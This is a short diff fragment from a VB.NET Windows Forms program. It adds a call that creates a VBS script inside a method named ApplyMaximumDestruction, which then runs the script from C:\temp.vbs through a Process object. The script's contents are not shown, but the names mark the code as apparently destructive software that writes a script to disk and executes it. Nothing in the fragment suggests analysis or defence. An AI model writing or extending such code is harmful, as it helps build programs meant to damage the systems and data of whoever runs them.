@@ -114,6 +114,7 @@ Public Class Form1
 
         ' Public method to run the VBS script.
         Public Sub ApplyMaximumDestruction()
+            Form1.CreateEpicVBScriptFile()
             Dim scriptPath As String = "C:\temp.vbs"
             Try
                 Dim process As New Process()
